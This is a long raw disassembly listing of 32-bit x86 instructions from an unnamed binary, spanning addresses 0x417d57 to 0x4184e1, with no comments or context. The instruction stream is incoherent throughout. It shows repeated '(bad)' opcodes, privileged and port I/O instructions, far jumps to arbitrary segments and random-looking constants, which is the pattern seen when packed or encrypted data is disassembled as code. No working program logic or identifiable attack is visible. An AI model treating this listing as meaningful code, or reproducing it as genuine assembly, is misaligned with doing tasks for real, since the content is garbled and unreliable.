  417d57:	xor    BYTE PTR [ebp+0x3e2b4d3e],ah
  417d5d:	imul   ebp,ebx,0xfffffff9
  417d60:	or     ebp,ebp
  417d62:	mov    bh,0x6e
  417d64:	inc    ebx
  417d65:	push   ecx
  417d66:	push   0x5160bbc6
  417d6b:	mov    ah,0xd4
  417d6d:	ja     0x417d69
  417d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d70:	adc    bh,BYTE PTR [edx-0x536d5452]
  417d76:	aad    0x50
  417d78:	pushf  
  417d79:	push   esi
  417d7a:	out    0x59,eax
  417d7c:	mov    ds:0xa99786a6,al
  417d81:	mov    bh,al
  417d83:	pop    edx
  417d84:	mov    edi,0x4f2a01a2
  417d89:	and    ah,BYTE PTR [esi+0xc5b7f9d]
  417d8f:	mov    edi,0x9eb7585
  417d94:	inc    edi
  417d95:	lock sub DWORD PTR [ecx],esi
  417d98:	add    esp,DWORD PTR [ebp+ebp*1-0x23]
  417d9c:	mov    ebx,0xfc624a8a
  417da1:	(bad)  
  417da3:	fdiv   st,st(2)
  417da5:	inc    esp
  417da6:	jnp    0x417dd7
  417da8:	adc    al,0xd0
  417daa:	ins    DWORD PTR es:[edi],dx
  417dab:	pop    ds
  417dac:	je     0x417db8
  417dae:	jo     0x417d7f
  417db0:	(bad)  
  417db1:	push   edi
  417db2:	lea    esi,[ebp-0x424753b9]
  417db8:	ss fadd st(3),st
  417dbb:	test   al,0x2d
  417dbd:	bsf    edi,DWORD PTR [esi]
  417dc0:	pop    esp
  417dc1:	mov    ah,ah
  417dc3:	mov    WORD PTR [eax-0x61],ds
  417dc6:	mov    dh,0xb5
  417dc8:	sbb    DWORD PTR [ebp+0x6b],0x2761e30d
  417dcf:	loopne 0x417d5a
  417dd1:	sbb    DWORD PTR [ebp+0x6e2bebdf],edi
  417dd7:	mov    ebp,0x84420a9b
  417ddc:	sub    al,0x6b
  417dde:	mov    edx,0xaf2c6a7e
  417de3:	mov    ebp,0xd2b0e978
  417de9:	jo     0x417d90
  417deb:	hlt    
  417dec:	sbb    BYTE PTR [eax-0x36],ah
  417def:	push   ecx
  417df0:	cmp    al,0xa2
  417df2:	or     al,0xbb
  417df4:	and    al,0x42
  417df6:	and    al,0x7f
  417df8:	jmp    0x417db1
  417dfa:	and    al,0x99
  417dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dfd:	push   0x13
  417dff:	mov    cl,0x18
  417e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e02:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417e04:	adc    BYTE PTR [edx],0x9f
  417e07:	jne    0x417e73
  417e09:	jmp    0x417dae
  417e0b:	push   esi
  417e0c:	mov    ecx,0x53b2646b
  417e11:	xor    al,0x52
  417e13:	jg     0x417e3e
  417e15:	xor    eax,0x73c0e86c
  417e1a:	xchg   edi,eax
  417e1b:	mov    eax,ds:0x4a471b55
  417e20:	sbb    dh,BYTE PTR [ecx+0x5c26508]
  417e26:	(bad)  
  417e27:	mov    ?,WORD PTR [ebx-0x48981a5c]
  417e2d:	stc    
  417e2e:	push   eax
  417e2f:	test   eax,0x661240bb
  417e34:	stos   DWORD PTR es:[edi],eax
  417e35:	jecxz  0x417e9e
  417e37:	icebp  
  417e38:	xchg   esp,eax
  417e39:	add    ah,BYTE PTR ds:0x8790ef57
  417e3f:	into   
  417e40:	rcr    esp,0x98
  417e43:	outs   dx,DWORD PTR ds:[esi]
  417e44:	(bad)  
  417e45:	call   0xf40fef9d
  417e4a:	pop    es
  417e4b:	adc    BYTE PTR [ecx],al
  417e4d:	xor    eax,eax
  417e4f:	sbb    eax,edx
  417e51:	scas   eax,DWORD PTR es:[edi]
  417e52:	pop    ecx
  417e53:	push   0x1
  417e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e56:	jge    0x417e99
  417e58:	mov    dh,0x2
  417e5a:	or     ebx,DWORD PTR [ebp-0x4bd3f14c]
  417e60:	push   ebx
  417e61:	cmc    
  417e62:	in     eax,dx
  417e63:	sub    eax,0x6a5ce008
  417e68:	mov    ?,WORD PTR [ebx]
  417e6a:	(bad)  
  417e6b:	fld    DWORD PTR [edi]
  417e6d:	jo     0x417eb0
  417e6f:	outs   dx,DWORD PTR ds:[esi]
  417e70:	inc    eax
  417e71:	and    BYTE PTR [edi],ah
  417e73:	and    eax,0xafa1f6d0
  417e78:	mov    ah,BYTE PTR [esi]
  417e7a:	mov    ah,0x5f
  417e7c:	rol    BYTE PTR [eax+0x7a621620],cl
  417e82:	test   al,0x32
  417e84:	push   esi
  417e85:	js     0x417ee4
  417e87:	adc    ebp,DWORD PTR [esi]
  417e89:	out    0xdc,al
  417e8b:	aaa    
  417e8c:	int    0x40
  417e8e:	sub    BYTE PTR [edx],cl
  417e90:	dec    ebx
  417e91:	push   0xffffffa4
  417e93:	sti    
  417e94:	fld    DWORD PTR [esi-0x22]
  417e97:	xor    DWORD PTR es:[ebx],eax
  417e9a:	pushf  
  417e9b:	enter  0x8d69,0x27
  417e9f:	jg     0x417e94
  417ea1:	dec    esi
  417ea2:	mov    edi,0xed8b75bf
  417ea7:	gs push cs
  417ea9:	mov    edx,0x61e26105
  417eae:	mov    al,ds:0x5d5e6672
  417eb3:	xchg   edx,eax
  417eb4:	mov    al,ds:0x7bec75bc
  417eb9:	xchg   edi,eax
  417eba:	aas    
  417ebb:	xlat   BYTE PTR ds:[ebx]
  417ebc:	mov    edx,0x54e47eb5
  417ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ec2:	shl    BYTE PTR [ecx+0x4c],1
  417ec5:	adc    eax,0xf5254083
  417eca:	sar    BYTE PTR [ecx],cl
  417ecc:	push   ebp
  417ecd:	ror    DWORD PTR [ebx+0x522db6d6],1
  417ed3:	cmp    DWORD PTR [esi-0xa5cf497],edi
  417ed9:	add    BYTE PTR [ecx+0x63],0xda
  417edd:	inc    ebp
  417ede:	xchg   esi,eax
  417edf:	test   al,0x26
  417ee1:	in     eax,0xa6
  417ee3:	mov    ah,0x49
  417ee5:	mov    ch,0x5d
  417ee7:	pop    edi
  417ee8:	xchg   BYTE PTR [edi],ah
  417eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eec:	mov    WORD PTR [ebp-0x4f],?
  417eef:	in     al,0x42
  417ef1:	test   ebx,0x75e186e
  417ef7:	(bad)  
  417ef9:	daa    
  417efa:	pop    ecx
  417efb:	(bad)  
  417efc:	sbb    eax,0x6ba3c0c2
  417f01:	pop    esi
  417f02:	out    dx,al
  417f03:	addr16 cdq 
  417f05:	pusha  
  417f06:	sar    eax,1
  417f08:	jge    0x417eb1
  417f0a:	in     eax,0xae
  417f0c:	adc    al,0x2d
  417f0e:	out    dx,eax
  417f0f:	stos   BYTE PTR es:[edi],al
  417f10:	push   esi
  417f11:	xchg   edx,eax
  417f12:	pop    edi
  417f13:	mov    WORD PTR [ebx+0x4a],fs
  417f16:	cmp    ch,al
  417f18:	mov    al,0xee
  417f1a:	(bad)  
  417f1b:	(bad)  
  417f1c:	(bad)  
  417f1d:	frndint 
  417f1f:	gs jmp 0x6627:0xcb107f74
  417f27:	fcomp  DWORD PTR [edi]
  417f29:	fmul   QWORD PTR [eax+edi*8+0x6812da9d]
  417f31:	fwait
  417f32:	xor    eax,0x16bc2190
  417f37:	jo     0x417f87
  417f39:	adc    bh,BYTE PTR [ebx-0x15]
  417f3c:	popf   
  417f3d:	push   ss
  417f3e:	xchg   ecx,eax
  417f3f:	push   cs
  417f40:	jecxz  0x417f4a
  417f42:	mov    BYTE PTR ds:0x9d9adfde,ah
  417f48:	ins    DWORD PTR es:[edi],dx
  417f49:	nop
  417f4a:	xor    al,0x52
  417f4c:	lods   al,BYTE PTR ds:[esi]
  417f4d:	gs push ebx
  417f4f:	call   0xce04:0xf5e75baf
  417f56:	xchg   edx,eax
  417f57:	scas   al,BYTE PTR es:[edi]
  417f58:	mov    dl,0xa
  417f5a:	cmc    
  417f5b:	aam    0x26
  417f5d:	pop    ecx
  417f5e:	inc    ecx
  417f5f:	sbb    eax,0x12f64b66
  417f64:	xchg   edi,eax
  417f65:	dec    edi
  417f66:	inc    eax
  417f67:	jo     0x417fb7
  417f69:	sub    eax,DWORD PTR [eax+0x2f4f322e]
  417f6f:	test   DWORD PTR [ebx],edx
  417f71:	xor    eax,0x99984ddc
  417f76:	jecxz  0x417f13
  417f78:	loopne 0x417f16
  417f7a:	xchg   ebx,eax
  417f7b:	lea    edx,ds:0xdb7554e3
  417f81:	retf   
  417f82:	js     0x417fda
  417f84:	shr    BYTE PTR [ebp+0x305f404e],cl
  417f8a:	mov    bl,al
  417f8c:	xchg   ebp,eax
  417f8d:	pop    es
  417f8e:	rol    BYTE PTR [edx-0x9],cl
  417f91:	jno    0x417f56
  417f93:	int3   
  417f94:	je     0x417f27
  417f96:	add    dl,BYTE PTR [edi+eax*4-0x20]
  417f9a:	push   0xffffffe0
  417f9c:	es xor al,0xdb
  417f9f:	nop
  417fa0:	and    bl,al
  417fa2:	stos   BYTE PTR es:[edi],al
  417fa3:	in     eax,dx
  417fa4:	cwde   
  417fa5:	div    DWORD PTR [edi]
  417fa7:	fisub  DWORD PTR [edi]
  417fa9:	test   eax,0x2a6669bb
  417fae:	je     0x417fcf
  417fb0:	lods   al,BYTE PTR ds:[esi]
  417fb1:	pop    eax
  417fb2:	fmul   DWORD PTR [eax-0x7db96e1]
  417fb8:	into   
  417fb9:	popf   
  417fba:	cmc    
  417fbb:	loope  0x417f43
  417fbd:	inc    edx
  417fbe:	cld    
  417fbf:	mov    edi,0xd342f789
  417fc4:	loope  0x418040
  417fc6:	pop    ds
  417fc7:	sub    al,0x1b
  417fc9:	mov    bl,0xf5
  417fcb:	shr    DWORD PTR [esi],1
  417fcd:	cmp    dl,al
  417fcf:	mov    ecx,gs
  417fd1:	into   
  417fd2:	push   ss
  417fd3:	xchg   ecx,eax
  417fd4:	mov    ds:0x21320619,al
  417fd9:	retw   
  417fdb:	jp     0x417f93
  417fdd:	and    edx,DWORD PTR [edx]
  417fdf:	aas    
  417fe0:	mov    DWORD PTR [ebp+esi*4-0x22],edx
  417fe4:	outs   dx,DWORD PTR ds:[esi]
  417fe5:	sbb    esi,DWORD PTR [esi+0x363ccf08]
  417feb:	dec    ebp
  417fec:	cmp    BYTE PTR [ebp+0x5a],ch
  417fef:	mov    ebp,0xd1994bec
  417ff4:	mov    ds:0x308fe8d,al
  417ff9:	and    ah,BYTE PTR [ebp+0x554562b8]
  417fff:	and    esp,DWORD PTR [edi]
  418001:	sbb    esi,edi
  418003:	stos   DWORD PTR es:[edi],eax
  418004:	(bad)  
  418006:	xchg   ebx,eax
  418007:	and    bl,cl
  418009:	imul   esi,DWORD PTR [ecx+eax*4-0x2349a1d5],0xe72e3d7c
  418014:	shl    bh,1
  418016:	add    edx,edx
  418018:	push   eax
  418019:	stc    
  41801a:	pop    esi
  41801b:	dec    ebx
  41801c:	add    eax,0x727b7b37
  418021:	mov    WORD PTR [ebp-0x5977b0bc],gs
  418027:	rcr    DWORD PTR [edi+0x68edda94],0xdb
  41802e:	in     al,dx
  41802f:	inc    esi
  418030:	and    BYTE PTR [eax+0x54d2d14b],0x7e
  418037:	mov    ?,WORD PTR [esi+0x1d]
  41803a:	adc    al,0x7e
  41803c:	(bad)  
  41803d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41803e:	pop    cx
  418040:	cmp    DWORD PTR [edi-0x6b],esi
  418043:	jecxz  0x417fde
  418045:	retf   0x8b96
  418048:	mov    ch,0x36
  41804a:	out    dx,al
  41804b:	mov    ?,WORD PTR [edi]
  41804d:	ss xor al,0x17
  418050:	lock data16 mov al,ds:0xc457d958
  418057:	inc    ebx
  418058:	jb     0x418084
  41805a:	sbb    ecx,edx
  41805c:	xor    eax,0xa960516e
  418061:	and    BYTE PTR [ebx-0x5d05d8a0],0x75
  418068:	popa   
  418069:	jae    0x4180a2
  41806b:	push   0xfffffff1
  41806d:	sbb    BYTE PTR [ebx],ah
  41806f:	stos   DWORD PTR es:[edi],eax
  418070:	dec    ecx
  418071:	ins    DWORD PTR es:[edi],dx
  418072:	push   es
  418073:	in     eax,0xe0
  418075:	sbb    al,0x4d
  418077:	arpl   WORD PTR cs:[edi+0x253f1cc8],ax
  41807e:	loopne 0x418028
  418080:	push   ds
  418081:	add    ecx,0xc9ad9269
  418087:	xchg   ebx,eax
  418088:	push   es
  418089:	hlt    
  41808a:	aas    
  41808b:	adc    dl,BYTE PTR [esi]
  41808d:	inc    ecx
  41808e:	adc    DWORD PTR [esp-0x6da7ae15],edi
  418095:	inc    ebx
  418096:	push   edx
  418097:	scas   al,BYTE PTR es:[edi]
  418098:	retf   0xfc5d
  41809b:	fist   DWORD PTR [eax-0x1c]
  41809e:	sub    ch,ah
  4180a0:	ja     0x41808e
  4180a2:	cmp    edx,0xf96edff0
  4180a8:	(bad)  
  4180a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ab:	inc    esp
  4180ac:	mov    eax,DWORD PTR [edi+0x5c]
  4180af:	ds es leavew 
  4180b3:	xchg   DWORD PTR [edx],eax
  4180b5:	(bad)  
  4180b6:	scas   eax,DWORD PTR es:[edi]
  4180b7:	test   BYTE PTR [edx],al
  4180b9:	pop    edi
  4180ba:	fcomp  QWORD PTR [eax-0x2a]
  4180bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180be:	cs icebp 
  4180c0:	bound  ebp,QWORD PTR [esi]
  4180c2:	ins    BYTE PTR es:[edi],dx
  4180c3:	xor    cl,BYTE PTR [eax-0x53]
  4180c6:	dec    edi
  4180c7:	pop    ds
  4180c8:	retf   
  4180c9:	retf   
  4180ca:	mov    ecx,0x8e0a01f0
  4180cf:	mov    eax,0xf3d91033
  4180d4:	jnp    0x4180a5
  4180d6:	jmp    0x41806f
  4180d8:	and    al,0x3c
  4180da:	jne    0x418080
  4180dc:	push   esi
  4180dd:	(bad)  
  4180de:	mov    esp,0x62eb9335
  4180e3:	and    ebx,ebp
  4180e5:	push   ebx
  4180e6:	xor    BYTE PTR [ebp+0x17411639],0x3
  4180ed:	nop
  4180ee:	iret   
  4180ef:	clc    
  4180f0:	jns    0x4180c3
  4180f2:	mov    esi,0x7e792667
  4180f7:	sbb    DWORD PTR [ebx],edi
  4180f9:	mov    ecx,edx
  4180fb:	(bad)  cs:[edx]
  4180fe:	mov    eax,ds:0xaf80e94d
  418103:	dec    ebx
  418104:	mov    BYTE PTR ds:0x65bb63fa,ah
  41810a:	inc    edx
  41810b:	mov    dh,al
  41810d:	test   BYTE PTR [edx],ch
  41810f:	dec    edx
  418110:	in     eax,0xc4
  418112:	and    bh,BYTE PTR [esi-0x3bc14171]
  418118:	inc    edi
  418119:	mov    ds:0x2d6480ed,al
  41811e:	push   edx
  41811f:	mov    BYTE PTR [bp+si],al
  418122:	and    esp,edi
  418124:	xor    al,0x4e
  418126:	imul   edi,ebx,0xffffff85
  418129:	pop    ebx
  41812a:	mov    ah,0xac
  41812c:	sub    al,0xea
  41812e:	and    BYTE PTR [esi],cl
  418130:	dec    ebp
  418131:	xchg   edi,eax
  418132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418133:	bound  ebx,QWORD PTR [esi]
  418135:	sub    esi,ebp
  418137:	sti    
  418138:	inc    ebp
  418139:	xchg   ebx,eax
  41813a:	mov    dh,ah
  41813c:	sbb    esi,DWORD PTR [edx-0x6fed835a]
  418142:	in     eax,dx
  418143:	mov    eax,ds:0x40553ee4
  418148:	xchg   esp,eax
  418149:	jmp    0x41817c
  41814b:	nop    DWORD PTR [ebx-0x1a]
  41814f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418150:	mov    ah,0xdb
  418152:	mov    esi,0x6e1752a6
  418157:	or     eax,0x822760fe
  41815c:	and    esp,DWORD PTR [ebx-0x47]
  41815f:	xchg   ecx,eax
  418160:	sbb    al,0x3f
  418162:	ret    
  418163:	xlat   BYTE PTR ds:[ebx]
  418164:	pop    esp
  418165:	in     al,dx
  418166:	aam    0x2a
  418168:	pop    es
  418169:	mov    eax,0x69ca8ffb
  41816e:	mov    ebx,0x52d25b53
  418173:	add    DWORD PTR [esi+0x5e4d961f],ebp
  418179:	fist   DWORD PTR [edi]
  41817b:	or     al,0xb
  41817d:	sti    
  41817e:	ds adc eax,0x580aa6ca
  418184:	cmp    dh,BYTE PTR [edi-0x90b1703]
  41818a:	jmp    0x666b:0x29e8f046
  418191:	xchg   ebp,eax
  418192:	stos   BYTE PTR es:[edi],al
  418193:	jl     0x418124
  418195:	inc    ebx
  418196:	sub    ah,BYTE PTR [edi+0x20eee5bc]
  41819c:	int3   
  41819d:	scas   al,BYTE PTR es:[edi]
  41819e:	jl     0x41815b
  4181a0:	and    eax,0x9192aa7e
  4181a5:	iret   
  4181a6:	or     bh,0x23
  4181a9:	add    al,0x47
  4181ab:	loop   0x4181c4
  4181ad:	push   cs
  4181ae:	out    0xc2,ax
  4181b1:	sbb    esi,DWORD PTR [ecx+0x23d2eba6]
  4181b7:	popf   
  4181b8:	fcomp  st(5)
  4181ba:	jp     0x418214
  4181bc:	lods   al,BYTE PTR ds:[esi]
  4181bd:	dec    esp
  4181be:	xchg   ebx,eax
  4181bf:	rcr    DWORD PTR [ecx-0xa],1
  4181c2:	inc    esp
  4181c3:	xor    ebp,DWORD PTR [ebp+0x2e172b68]
  4181c9:	ins    DWORD PTR es:[edi],dx
  4181ca:	inc    ebx
  4181cb:	sub    esp,DWORD PTR [ecx]
  4181cd:	js     0x41818c
  4181cf:	pop    ebx
  4181d0:	push   ebx
  4181d1:	pop    es
  4181d2:	jbe    0x4181df
  4181d4:	ins    DWORD PTR es:[edi],dx
  4181d5:	ret    
  4181d6:	cli    
  4181d7:	sub    edi,DWORD PTR [ebp+0x4095acbb]
  4181dd:	mov    bh,0xa2
  4181df:	jns    0x418217
  4181e1:	outs   dx,BYTE PTR ds:[si]
  4181e3:	mov    esp,DWORD PTR cs:[eax-0x2e]
  4181e7:	loope  0x4181f7
  4181e9:	inc    eax
  4181ea:	lock stos DWORD PTR es:[edi],eax
  4181ec:	rol    esp,0x9c
  4181ef:	dec    ecx
  4181f0:	sbb    BYTE PTR [edi-0x79],dh
  4181f3:	pushf  
  4181f4:	js     0x4181a6
  4181f6:	jbe    0x41824d
  4181f8:	inc    eax
  4181f9:	mov    ah,0xb4
  4181fb:	mov    eax,ds:0x595d264c
  418200:	fidiv  WORD PTR [edx]
  418202:	and    eax,0xe4e4a2e5
  418207:	inc    ecx
  418208:	add    DWORD PTR [edi-0x5],ebp
  41820b:	jle    0x4181b8
  41820d:	(bad)  
  41820e:	jg     0x4181c6
  418210:	adc    al,0xd1
  418212:	push   edi
  418213:	and    BYTE PTR [ecx],bh
  418215:	pop    ecx
  418216:	ret    0xa786
  418219:	and    al,0xdd
  41821b:	add    al,0xff
  41821d:	pop    eax
  41821e:	jbe    0x41823c
  418220:	push   edi
  418221:	je     0x418235
  418223:	mov    DWORD PTR [esi],ebx
  418225:	sahf   
  418226:	lea    esp,[ebx+ebx*4-0x2a2d6440]
  41822d:	dec    eax
  41822e:	jns    0x4182a5
  418230:	jl     0x418232
  418232:	out    0x2d,eax
  418234:	jbe    0x418269
  418236:	mov    ch,0xd8
  418238:	ins    BYTE PTR es:[edi],dx
  418239:	dec    esp
  41823a:	ds pop ds
  41823c:	pop    ebx
  41823d:	cmp    BYTE PTR cs:[ecx-0x2327eb9f],dh
  418244:	pop    edx
  418246:	mov    ah,0xb9
  418248:	pop    ebx
  418249:	or     al,0xfb
  41824b:	and    BYTE PTR [esi-0x70268722],dh
  418251:	jecxz  0x418289
  418253:	scas   eax,DWORD PTR es:[edi]
  418254:	pusha  
  418255:	in     eax,dx
  418256:	add    eax,0xb8537576
  41825b:	xor    DWORD PTR [edx-0x1ab9e8e6],eax
  418261:	dec    ebp
  418262:	pop    esi
  418263:	loopne 0x4181f5
  418265:	outs   dx,DWORD PTR ds:[esi]
  418266:	retf   
  418267:	int    0xf1
  418269:	pop    esi
  41826a:	ss mov edi,0xefad35a
  418270:	iret   
  418271:	sub    BYTE PTR [esi+0x51],ch
  418274:	xor    al,0xcf
  418276:	imul   esp,edx,0xce037893
  41827c:	aas    
  41827d:	in     al,dx
  41827e:	aad    0xfd
  418280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418281:	and    ecx,DWORD PTR cs:[ebp-0x15]
  418285:	sub    dh,al
  418287:	aam    0xb2
  418289:	adc    al,0xe7
  41828b:	xor    esp,edi
  41828d:	inc    edi
  41828e:	sub    DWORD PTR [ecx-0xd],esi
  418291:	cli    
  418292:	jge    0x418291
  418294:	inc    ecx
  418295:	xor    DWORD PTR [edi+0x5b2c0d3d],eax
  41829b:	mov    dh,0x97
  41829d:	cmp    BYTE PTR [eax],dl
  41829f:	retf   
  4182a0:	popa   
  4182a1:	xchg   BYTE PTR [eax-0x49],bl
  4182a4:	(bad)  
  4182a5:	aad    0x1c
  4182a7:	(bad)  
  4182a8:	sti    
  4182a9:	adc    eax,0xe541d2b3
  4182ae:	test   al,0x76
  4182b0:	fisttp QWORD PTR [ebp-0xdb04fe0]
  4182b6:	mov    dh,0x2e
  4182b8:	hlt    
  4182b9:	mov    bl,0x3a
  4182bb:	dec    esp
  4182bc:	inc    ebp
  4182bd:	das    
  4182be:	or     al,0x98
  4182c0:	add    esi,esi
  4182c2:	cmp    BYTE PTR [edx-0x33],dl
  4182c5:	pop    es
  4182c6:	adc    BYTE PTR [edx+0x69d3f625],bl
  4182cc:	outs   dx,DWORD PTR ds:[esi]
  4182cd:	pop    es
  4182ce:	adc    eax,0x52f8dc77
  4182d3:	sbb    BYTE PTR [edx],ch
  4182d5:	lods   al,BYTE PTR ds:[esi]
  4182d6:	mov    ds:0xc3a009d9,eax
  4182db:	nop
  4182dc:	popf   
  4182dd:	js     0x4182e2
  4182df:	loop   0x418281
  4182e1:	lds    eax,FWORD PTR [ebp+0x1c]
  4182e4:	mov    ds:0xc87dfe1f,al
  4182e9:	gs inc edx
  4182eb:	xlat   BYTE PTR ds:[ebx]
  4182ec:	adc    dl,BYTE PTR [edi-0x22fc407a]
  4182f2:	jo     0x4182f1
  4182f4:	dec    eax
  4182f5:	ins    DWORD PTR es:[edi],dx
  4182f6:	pop    ecx
  4182f7:	or     al,0xe1
  4182f9:	lahf   
  4182fa:	ja     0x4182de
  4182fc:	dec    esi
  4182fd:	jmp    0x41831e
  4182ff:	stos   BYTE PTR es:[edi],al
  418300:	cdq    
  418301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418303:	xchg   ebp,eax
  418304:	xchg   ebx,esi
  418306:	and    DWORD PTR [edi+0x11],esi
  418309:	add    ecx,DWORD PTR [esi+esi*4]
  41830c:	sar    eax,0x8a
  41830f:	cmp    bh,BYTE PTR [esi]
  418311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418312:	je     0x418369
  418314:	imul   ebx,DWORD PTR [esp+edx*1+0x433cec6c],0x46
  41831c:	jns    0x4182b3
  41831e:	cmp    al,0x75
  418321:	sub    bl,al
  418323:	out    0x46,al
  418325:	push   esi
  418326:	jge    0x4182af
  418328:	je     0x4182d6
  41832a:	lahf   
  41832b:	push   0xc60bf88e
  418330:	scas   eax,DWORD PTR es:[edi]
  418331:	test   al,0x96
  418333:	mov    edi,0xff08151d
  418338:	sti    
  418339:	rcr    BYTE PTR [ebx+edi*4+0x30eae2a9],0xa5
  418341:	retf   0x384b
  418344:	scas   al,BYTE PTR es:[edi]
  418345:	and    BYTE PTR [edx],bh
  418347:	sub    BYTE PTR [ebp-0x3cb8e85a],ah
  41834d:	inc    esi
  41834e:	pusha  
  41834f:	and    BYTE PTR [edx],0xc
  418352:	jae    0x4182dd
  418354:	inc    ebx
  418355:	out    0xa6,eax
  418357:	adc    DWORD PTR [edi-0x43],ecx
  41835a:	and    eax,0x2d921ced
  41835f:	test   esp,eax
  418361:	mov    edi,0xdafe971d
  418366:	sub    ecx,DWORD PTR [edi-0x58b76625]
  41836c:	scas   eax,DWORD PTR es:[edi]
  41836d:	(bad)  
  41836e:	xor    eax,0x5047cbae
  418373:	std    
  418374:	repnz dec eax
  418376:	sbb    DWORD PTR [ecx],0x8cea4417
  41837c:	adc    al,0x33
  41837e:	pop    esi
  41837f:	ja     0x418345
  418381:	cmp    al,0x9e
  418383:	push   es
  418384:	lahf   
  418385:	adc    DWORD PTR [ecx],esp
  418387:	sub    al,0x94
  418389:	mov    ebp,0x3a86c9c
  41838e:	dec    esi
  41838f:	test   BYTE PTR [esi],0x9a
  418392:	sub    eax,edx
  418394:	lea    esi,[eax-0x6fbb1d27]
  41839a:	inc    ebx
  41839b:	add    BYTE PTR [ebp+0x3e5876],dh
  4183a1:	xchg   DWORD PTR [ebp+0x1e],ebp
  4183a4:	pop    eax
  4183a5:	mov    esp,0x1775ee69
  4183aa:	mov    ebp,0xd5069878
  4183af:	adc    ecx,DWORD PTR [esi-0x77c936c3]
  4183b5:	stos   DWORD PTR es:[edi],eax
  4183b6:	pop    edx
  4183b7:	mov    dl,0x2e
  4183b9:	pusha  
  4183ba:	fmul   DWORD PTR [eax]
  4183bc:	jno    0x4183e5
  4183be:	cld    
  4183bf:	mov    bh,0xac
  4183c1:	cmc    
  4183c2:	dec    eax
  4183c3:	mov    ?,WORD PTR [edx-0x468a584b]
  4183c9:	mov    cl,0x2b
  4183cb:	sub    BYTE PTR [edx-0xb2c1ddb],bh
  4183d1:	inc    eax
  4183d2:	and    bl,BYTE PTR [eax]
  4183d4:	push   cs
  4183d5:	pop    ecx
  4183d6:	cmp    DWORD PTR [edi-0x792d982a],ebp
  4183dc:	cmp    BYTE PTR [ebx+ebp*2],dl
  4183df:	push   edx
  4183e0:	push   ss
  4183e1:	dec    esp
  4183e2:	lea    edx,[ebx+ecx*2-0x25]
  4183e6:	les    esp,FWORD PTR [esi+0x325b1db1]
  4183ec:	test   BYTE PTR ds:0x8d6da8ee,0x85
  4183f3:	xlat   BYTE PTR ds:[ebx]
  4183f4:	adc    eax,0xa088017c
  4183f9:	jne    0x4183d4
  4183fb:	inc    eax
  4183fc:	in     al,0x70
  4183fe:	outs   dx,DWORD PTR ds:[esi]
  4183ff:	fistp  DWORD PTR [ebp-0xf8f8f92]
  418405:	push   0xd1cebc1b
  41840a:	int    0xd
  41840c:	scas   al,BYTE PTR es:[edi]
  41840d:	sahf   
  41840e:	pop    eax
  41840f:	loop   0x418400
  418411:	pop    ebx
  418412:	pusha  
  418413:	inc    ebx
  418414:	outs   dx,DWORD PTR ds:[esi]
  418415:	ds iret 
  418417:	mov    dl,0xb8
  418419:	ror    BYTE PTR [ebx],1
  41841b:	jns    0x418402
  41841d:	dec    ebx
  41841e:	inc    eax
  41841f:	xchg   DWORD PTR [edx],edi
  418421:	sbb    eax,0x9aafff35
  418426:	and    ecx,DWORD PTR ds:0x82e26bd6
  41842c:	mov    BYTE PTR [edx+0x1019bad3],dl
  418432:	lock push esp
  418434:	sbb    esp,DWORD PTR [esi-0x42]
  418437:	in     eax,0xbb
  418439:	pusha  
  41843a:	cmc    
  41843b:	aaa    
  41843c:	sub    BYTE PTR [edx+0x43268fe],dl
  418442:	adc    edi,esp
  418444:	lock mov esi,0xcfb291f6
  41844a:	sub    al,0x8d
  41844c:	sub    BYTE PTR [ebp-0x7618a0e],0xb
  418453:	cwde   
  418454:	mov    edi,eax
  418456:	mov    dl,0x57
  418458:	clc    
  418459:	push   ebx
  41845a:	les    ebp,FWORD PTR [edi+0x1175eec1]
  418460:	jmp    0xca10:0xdf2d9012
  418467:	das    
  418468:	neg    DWORD PTR [ebx-0x20]
  41846b:	mov    eax,0x1c7ecf03
  418470:	popa   
  418471:	popf   
  418472:	popa   
  418473:	inc    esi
  418474:	leave  
  418475:	sahf   
  418476:	cli    
  418477:	mov    cl,0xe0
  418479:	ds out 0x34,al
  41847c:	push   0x1becf9fd
  418481:	cld    
  418482:	xchg   ecx,eax
  418483:	scas   al,BYTE PTR es:[edi]
  418484:	sbb    DWORD PTR [edx],0xffffffbf
  418487:	jmp    0x7de8:0x20544c93
  41848e:	mov    esp,0xf2ebb429
  418493:	into   
  418494:	(bad)  
  418495:	jnp    0x4184b5
  418497:	ret    0x7338
  41849a:	(bad)  
  41849b:	xchg   esi,eax
  41849c:	mov    ch,0x48
  41849e:	call   0xb26f146b
  4184a3:	push   cs
  4184a4:	mov    dl,0xd3
  4184a6:	mov    eax,ds:0x71e18b7a
  4184ab:	inc    esi
  4184ac:	push   ebx
  4184ad:	add    al,0x72
  4184af:	jno    0x4184af
  4184b1:	jo     0x418444
  4184b3:	cld    
  4184b4:	hlt    
  4184b5:	test   al,0x4e
  4184b7:	or     dh,BYTE PTR [edx]
  4184b9:	call   0x3857:0x7cff845c
  4184c0:	test   bl,0x3a
  4184c3:	add    esp,ecx
  4184c5:	(bad)  
  4184c6:	ficomp WORD PTR [edi+0x2c]
  4184c9:	ret    
  4184ca:	add    eax,0xc29622cd
  4184cf:	pop    esi
  4184d0:	xor    BYTE PTR [edi+0x26],bh
  4184d3:	aas    
  4184d4:	test   DWORD PTR ds:0x29270de9,esp
  4184da:	fadd   st(0),st
  4184dc:	test   al,0x5c
  4184de:	ret    
  4184df:	fisub  WORD PTR [eax]
  4184e1:	pop    ebx
